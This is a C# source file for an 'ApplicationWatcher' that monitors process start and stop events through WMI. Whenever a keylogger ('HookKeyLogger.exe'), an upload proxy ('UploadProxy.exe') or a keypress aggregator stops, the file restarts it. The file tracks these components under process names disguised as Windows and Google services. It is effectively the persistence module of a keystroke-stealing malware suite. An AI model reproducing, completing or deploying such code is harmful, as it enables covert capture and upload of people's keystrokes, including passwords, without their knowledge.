﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management;
using System.Diagnostics;

namespace ApplicationWatcher
{
    public class ApplicationWatcherAsync
    {
        //private void WmiEventHandler(object sender, EventArrivedEventArgs e)
        //{
        //    //in this point the new events arrives
        //    //you can access to any property of the Win32_Process class
        //    Console.WriteLine("TargetInstance.Handle :    " + ((ManagementBaseObject)e.NewEvent.Properties["TargetInstance"].Value)["Handle"]);
        //    Console.WriteLine("TargetInstance.Name :      " + ((ManagementBaseObject)e.NewEvent.Properties["TargetInstance"].Value)["Name"]);

        //}

        //public ApplicationWatcherAsync()
        //{
        //    try
        //    {
        //        string ComputerName = "localhost";
        //        string WmiQuery;
        //        ManagementEventWatcher Watcher;
        //        ManagementScope Scope;

        //        Scope = new ManagementScope(String.Format("\\\\{0}\\root\\CIMV2", ComputerName), null);
        //        Scope.Connect();

        //        WmiQuery = "Select * From __InstanceCreationEvent Within 1 " +
        //        "Where TargetInstance ISA 'Win32_Process' ";

        //        Watcher = new ManagementEventWatcher(Scope, new EventQuery(WmiQuery));
        //        Watcher.EventArrived += new EventArrivedEventHandler(this.WmiEventHandler);
        //        Watcher.Start();
        //        Console.Read();
        //        Watcher.Stop();
        //    }
        //    catch (Exception e)
        //    {
        //        Console.WriteLine("Exception {0} Trace {1}", e.Message, e.StackTrace);
        //    }

        //}

        //public static void Main(string[] args)
        //{
        //    Console.WriteLine("Listening process creation, Press Enter to exit");
        //    ApplicationWatcherAsync eventWatcher = new ApplicationWatcherAsync();
        //    Console.Read();
        //}
        private static string locationExeHook = "HookKeyLogger.exe";
        private static string locationExeProxy="UploadProxy.exe";
        private static string locationExeAgg = "KeypressAggregator.exe";

        ///<summary>
        ///Monitor the WMI to see when processes start and stop.
        ///</summary>
        public static void Main()
        {
            bool debugOn = true;
            //System.Threading.Thread.Sleep(1000);
            if(!debugOn)
                startAll();
            ManagementEventWatcher startWatch = new ManagementEventWatcher(
              new WqlEventQuery("SELECT * FROM Win32_ProcessStartTrace"));
            startWatch.EventArrived += new EventArrivedEventHandler(startWatch_EventArrived);
            startWatch.Start();
            ManagementEventWatcher stopWatch = new ManagementEventWatcher(
              new WqlEventQuery("SELECT * FROM Win32_ProcessStopTrace"));
            stopWatch.EventArrived += new EventArrivedEventHandler(stopWatch_EventArrived);
            stopWatch.Start();
            Console.WriteLine("Press any key to exit");
            while (!Console.KeyAvailable) System.Threading.Thread.Sleep(50);
            startWatch.Stop();
            stopWatch.Stop();
        }
        ///<summary>
        ///Check that the process is active.
        ///</summary>
        private static bool isActive(string name)
        {
            foreach (Process clsProcess in Process.GetProcesses())
            {
                if (clsProcess.ProcessName.Contains(name))
                {
                    return true;
                }
            }
            return false;
        }

        private static void startAll()
        {
            int[] active = new int[4] { 0, 0, 0, 0 };
            foreach (Process clsProcess in Process.GetProcesses())
            {
                string name = clsProcess.ProcessName;
                if (name == "Windows Driver Foundation - User-mode Driver Framework Host Process")
                {
                    active[0] = 1;
                }
                else if (name == "Google Site Proxy")
                {
                    active[1] = 1;
                }
                else if (name == "Host Process for Windows Tasks")
                {
                    active[2] = 1;
                }
            }

            if (active[0]==0)
            {
                //System.Threading.Thread.Sleep(10000);
                System.Diagnostics.Process.Start(locationExeHook);
            }
            else if (active[1] == 0)
            {
                //System.Threading.Thread.Sleep(10000);
                System.Diagnostics.Process.Start(locationExeProxy);
            }
            else if (active[2] == 0)
            {
                //System.Threading.Thread.Sleep(10000);
                System.Diagnostics.Process.Start(locationExeAgg);
            }

        }

        ///<summary>
        ///See that a process has stopped.
        ///</summary>
        static void stopWatch_EventArrived(object sender, EventArrivedEventArgs e)
        {
            string name = e.NewEvent.Properties["ProcessName"].Value.ToString();
            Console.WriteLine("Process stopped: {0}", name);
            if(name == "Windows Driver Foundation - User-mode Driver Framework Host Process")
            {
                //System.Threading.Thread.Sleep(10000);
                System.Diagnostics.Process.Start(locationExeHook);
            }
            else if(name == "Google Site Proxy")
            {
                //System.Threading.Thread.Sleep(10000);
                System.Diagnostics.Process.Start(locationExeProxy);
            }
            else if (name == "Host Process for Windows Tasks")
            {
                //System.Threading.Thread.Sleep(10000);
                System.Diagnostics.Process.Start(locationExeAgg);
            }

        }

        ///<summary>
        ///See that a process has started.
        ///</summary>
        private static void startWatch_EventArrived(object sender, EventArrivedEventArgs e)
        {
            //Console.WriteLine("Process started: {0}", e.NewEvent.Properties["ProcessName"].Value);
            string name = e.NewEvent.Properties["ProcessName"].Value.ToString();
            Console.WriteLine("Process started: {0}", name);
            //if (name == "Chrome.exe")
            //{
            //    Console.WriteLine("Found");
            //    if (!isActive("Windows Printer Discovery Service"))
            //        System.Diagnostics.Process.Start(locationExe);
            //}
        }
    }
}
